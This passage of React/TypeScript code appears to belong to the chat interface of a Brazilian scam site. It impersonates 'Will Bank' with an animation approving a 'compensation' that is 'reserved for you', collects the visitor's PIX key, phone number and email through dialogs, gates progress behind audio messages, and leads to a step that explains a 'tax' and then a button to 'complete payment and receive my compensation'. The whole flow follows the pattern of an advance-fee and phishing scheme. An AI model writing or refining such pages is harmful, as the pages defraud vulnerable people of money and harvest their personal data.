                  <Button onClick={handlePixTypeEmail} variant="outline" className="bg-slate-700 hover:bg-slate-600 text-white border-slate-600 rounded-full font-bold shadow-lg px-6 sm:px-8 text-xs sm:text-sm h-10">
                    📧 E-mail
                  </Button>
                </div>}

              {step === "pix-confirm" && <Button onClick={handleConfirmPix} className="bg-gradient-to-r from-green-500 to-emerald-500 text-white rounded-full font-bold shadow-lg px-5 sm:px-8 text-xs sm:text-sm">
                  ✓ Sim, está correto
                </Button>}

              {step === "audio-2-comprovante" && (waitingForAudio === null || audioListened.has("/audio/audio-2.mp3")) && <Button onClick={handleGenerateComprovante} className="bg-gradient-to-r from-primary to-amber-400 text-primary-foreground rounded-full font-bold shadow-lg px-5 sm:px-8 text-xs sm:text-sm">
                  CONFIRMAR
                </Button>}

              {step === "audio-2-comprovante" && waitingForAudio === "/audio/audio-2.mp3" && !audioListened.has("/audio/audio-2.mp3") && <p className="text-slate-400 text-xs animate-pulse">🎧 Ouça o áudio acima para continuar...</p>}

              {step === "envio-selection" && <div className="flex flex-col gap-1.5 sm:gap-2 w-full max-w-xs">
                  <Button onClick={handleSMSOption} className="bg-gradient-to-r from-primary to-amber-400 text-primary-foreground rounded-full font-bold shadow-lg px-6 sm:px-8 flex items-center gap-2 text-xs sm:text-sm h-10">
                    <Smartphone className="w-4 h-4" />
                    Receber por SMS
                  </Button>
                  <Button onClick={handleEmailOption} variant="outline" className="bg-slate-700 hover:bg-slate-600 text-white border-slate-600 rounded-full font-bold shadow-lg px-6 sm:px-8 flex items-center gap-2 text-xs sm:text-sm h-10">
                    <Mail className="w-4 h-4" />
                    Receber por E-mail
                  </Button>
                </div>}

              {step === "taxa-info" && <Button onClick={handleTaxExplanation} className="bg-gradient-to-r from-orange-500 to-amber-500 hover:from-orange-600 hover:to-amber-600 text-white rounded-full font-bold shadow-lg text-xs sm:text-sm px-4 sm:px-6">
                  ❓ PORQUE TENHO QUE PAGAR ESSE IMPOSTO?
                </Button>}

              {step === "final" && (waitingForAudio === null || audioListened.has("/audio/audio-3.mp3")) && <Button onClick={handleFinalPayment} className="bg-gradient-to-r from-green-500 to-emerald-500 hover:from-green-600 hover:to-emerald-600 text-white rounded-full font-bold shadow-lg px-4 sm:px-6 animate-pulse text-xs sm:text-sm">
                  💰 Concluir pagamento e receber minha indenização
                </Button>}

              {step === "final" && waitingForAudio === "/audio/audio-3.mp3" && !audioListened.has("/audio/audio-3.mp3") && <p className="text-slate-400 text-xs animate-pulse">🎧 Ouça o áudio acima para continuar...</p>}
            </div>}

          <div ref={messagesEndRef} />
        </div>
      </main>

      {/* Chat Input Area */}
      <div className="bg-slate-800 border-t border-slate-700 p-2 sm:p-3 safe-area-pb">
        <div className="max-w-2xl mx-auto flex items-center gap-1.5 sm:gap-2">
          <button className="p-1.5 sm:p-2 text-slate-400 hover:text-white transition-colors">
            <Smile className="w-5 h-5 sm:w-6 sm:h-6" />
          </button>
          
          <div className="flex-1 bg-slate-700 rounded-full px-3 sm:px-4 py-2 text-slate-400 text-xs sm:text-sm">
            Digite uma mensagem...
          </div>
          
          <button className="p-1.5 sm:p-2 text-slate-400 hover:text-white transition-colors">
            <Paperclip className="w-5 h-5 sm:w-6 sm:h-6" />
          </button>
          <button className="p-2 sm:p-2.5 bg-primary rounded-full text-primary-foreground hover:bg-primary/90 transition-colors">
            <Mic className="w-4 h-4 sm:w-5 sm:h-5" />
          </button>
        </div>
      </div>

      {/* Dialog for PIX key input (telefone/email) */}
      <Dialog open={pixDialogOpen} onOpenChange={setPixDialogOpen}>
        <DialogContent className="sm:max-w-md">
          <DialogHeader>
            <DialogTitle className="text-center">
              {dialogType === "telefone" ? "📱 Digite sua chave PIX (Telefone)" : "📧 Digite sua chave PIX (E-mail)"}
            </DialogTitle>
          </DialogHeader>
          <div className="space-y-4 py-4">
            <Input
              placeholder={dialogType === "telefone" ? "(00) 00000-0000" : "seuemail@exemplo.com"}
              type={dialogType === "email" ? "email" : "text"}
              value={pixKeyInput}
              onChange={(e) => setPixKeyInput(e.target.value)}
              className="h-12 text-base"
              autoFocus
            />
            <Button
              onClick={handlePixKeySubmit}
              disabled={!pixKeyInput.trim()}
              className="w-full h-12 bg-gradient-to-r from-primary to-amber-400 text-primary-foreground font-bold rounded-full"
            >
              <Send className="w-4 h-4 mr-2" />
              Confirmar
            </Button>
          </div>
        </DialogContent>
      </Dialog>

      {/* Dialog for comprovante input (SMS/email) */}
      <Dialog open={comprovanteDialogOpen} onOpenChange={setComprovanteDialogOpen}>
        <DialogContent className="sm:max-w-md">
          <DialogHeader>
            <DialogTitle className="text-center">
              {dialogType === "sms" ? "📱 Digite seu número de celular" : "📧 Digite seu e-mail"}
            </DialogTitle>
          </DialogHeader>
          <div className="space-y-4 py-4">
            {dialogType === "sms" ? (
              <>
                <Input
                  placeholder="(00) 00000-0000"
                  value={phoneNumber}
                  onChange={(e) => setPhoneNumber(e.target.value)}
                  className="h-12 text-base"
                  autoFocus
                />
                <Button
                  onClick={handlePhoneSubmit}
                  disabled={!phoneNumber.trim()}
                  className="w-full h-12 bg-gradient-to-r from-primary to-amber-400 text-primary-foreground font-bold rounded-full"
                >
                  <Send className="w-4 h-4 mr-2" />
                  Enviar Comprovante
                </Button>
              </>
            ) : (
              <>
                <Input
                  placeholder="seuemail@exemplo.com"
                  type="email"
                  value={emailInput}
                  onChange={(e) => setEmailInput(e.target.value)}
                  className="h-12 text-base"
                  autoFocus
                />
                <Button
                  onClick={handleEnvioEmailSubmit}
                  disabled={!emailInput.trim()}
                  className="w-full h-12 bg-gradient-to-r from-primary to-amber-400 text-primary-foreground font-bold rounded-full"
                >
                  <Send className="w-4 h-4 mr-2" />
                  Enviar Comprovante
                </Button>
              </>
            )}
          </div>
        </DialogContent>
      </Dialog>
    </div>;
};

// Helper Components
const DataRow = ({
  label,
  value,
  highlight = false
}: {
  label: string;
  value: string;
  highlight?: boolean;
}) => {
  return <div className="flex justify-between p-3 bg-card">
      <span className="text-sm text-muted-foreground font-medium">{label}</span>
      <span className={`text-sm font-bold text-right ${highlight ? 'text-green-600 text-base' : 'text-foreground'}`}>{value}</span>
    </div>;
};
const AudioPlayerComponent = forwardRef<HTMLDivElement, {
  audioSrc: string;
  isPlaying: boolean;
  onPlay: () => void;
  listened?: boolean;
  disabled?: boolean;
}>(({
  audioSrc,
  isPlaying,
  onPlay,
  listened,
  disabled
}, ref) => <div ref={ref} className="flex items-center gap-3 w-48">
    <button
      onClick={onPlay}
      disabled={disabled}
      className={`w-10 h-10 rounded-full flex items-center justify-center shadow-md transition-transform shrink-0 relative ${disabled ? 'opacity-50 cursor-not-allowed bg-muted' : 'bg-gradient-to-br from-primary to-amber-400 hover:scale-105'}`}
      aria-disabled={disabled}
      title={disabled ? 'Ouça os áudios anteriores primeiro' : 'Reproduzir áudio'}
    >
      {isPlaying ? <Pause className="w-5 h-5 text-primary-foreground" fill="currentColor" /> : <Play className="w-5 h-5 text-primary-foreground ml-0.5" fill="currentColor" />}
      {listened && <span className="absolute -top-1 -right-1 w-4 h-4 bg-green-500 rounded-full flex items-center justify-center border-2 border-slate-700">
          <Check className="w-2.5 h-2.5 text-white" />
        </span>}
    </button>
    <div className="flex-1 flex flex-col gap-1">
      <div className="h-8 flex items-center gap-0.5">
        {[...Array(16)].map((_, i) => <div key={i} className={`w-1 rounded-full transition-all ${disabled ? 'bg-muted' : isPlaying ? 'bg-primary animate-pulse' : listened ? 'bg-green-500' : 'bg-slate-500'}`} style={{
        height: `${Math.random() * 16 + 8}px`,
        animationDelay: `${i * 50}ms`
      }} />)}
      </div>
      {listened && <span className="text-[10px] text-green-400 flex items-center gap-1">
          <Check className="w-3 h-3" /> Ouvido
        </span>}
    </div>
  </div>);
AudioPlayerComponent.displayName = "AudioPlayerComponent";

// Approval Animation Component - Like the reference image
const ApprovalAnimation = ({
  value,
  name
}: {
  value: number;
  name: string;
}) => {
  const [step1, setStep1] = useState(false);
  const [step2, setStep2] = useState(false);
  const [step3, setStep3] = useState(false);
  const [showValue, setShowValue] = useState(false);
  useEffect(() => {
    const timer1 = setTimeout(() => setStep1(true), 500);
    const timer2 = setTimeout(() => setStep2(true), 1000);
    const timer3 = setTimeout(() => setStep3(true), 1500);
    const timer4 = setTimeout(() => setShowValue(true), 2000);
    return () => {
      clearTimeout(timer1);
      clearTimeout(timer2);
      clearTimeout(timer3);
      clearTimeout(timer4);
    };
  }, []);
  return <div className="bg-card border-2 border-primary/30 rounded-2xl p-5 space-y-5 shadow-lg">
      <div className="flex justify-center">
        <img src={willbankLogo} alt="Will Bank" className="h-10" />
      </div>
      
      <div className="h-1 bg-gradient-to-r from-primary via-primary to-amber-400 rounded-full" />
      
      <div className="flex items-center justify-center gap-2">
        <div className="flex flex-col items-center gap-1">
          <AnimatedCheckDot completed={step1} />
          <span className="text-[10px] text-muted-foreground">Solicitando Aprovação</span>
        </div>
        <div className={`w-8 h-0.5 transition-all duration-500 ${step1 && step2 ? 'bg-primary' : 'bg-muted'}`} />
        <div className="flex flex-col items-center gap-1">
          <AnimatedCheckDot completed={step2} />
          <span className="text-[10px] text-muted-foreground">Analisando Dados</span>
        </div>
        <div className={`w-8 h-0.5 transition-all duration-500 ${step2 && step3 ? 'bg-primary' : 'bg-muted'}`} />
        <div className="flex flex-col items-center gap-1">
          <AnimatedCheckDot completed={step3} />
          <span className="text-[10px] text-muted-foreground">Indenização Aprovada</span>
        </div>
      </div>

      <div className="text-center space-y-2">
        <p className={`font-bold text-foreground transition-opacity duration-500 ${showValue ? 'opacity-100' : 'opacity-50'}`}>
          {name}
        </p>
        <p className={`text-sm text-muted-foreground transition-opacity duration-500 ${showValue ? 'opacity-100' : 'opacity-0'}`}>
          Sua indenização no valor de
        </p>
        <p className={`text-3xl font-black text-primary transition-all duration-700 ${showValue ? 'opacity-100 scale-100' : 'opacity-0 scale-75'}`}>
          R$ {value.toLocaleString('pt-BR', {
          minimumFractionDigits: 2
        })}
        </p>
        <p className={`text-xs text-muted-foreground transition-opacity duration-500 ${showValue ? 'opacity-100' : 'opacity-0'}`}>
          Este valor está reservado para você.<br />
          Complete os próximos passos para receber sua indenização ainda hoje.
        </p>
      </div>
    </div>;
};
const AnimatedCheckDot = forwardRef<HTMLDivElement, {
  completed: boolean;
}>(({
  completed
}, ref) => <div ref={ref} className={`w-8 h-8 rounded-full flex items-center justify-center transition-all duration-500 ${completed ? 'bg-gradient-to-br from-primary to-amber-400 scale-100' : 'bg-muted scale-75'}`}>
      {completed && <Check className="w-4 h-4 text-primary-foreground animate-scale-in" />}
    </div>);
AnimatedCheckDot.displayName = "AnimatedCheckDot";
export default Chat;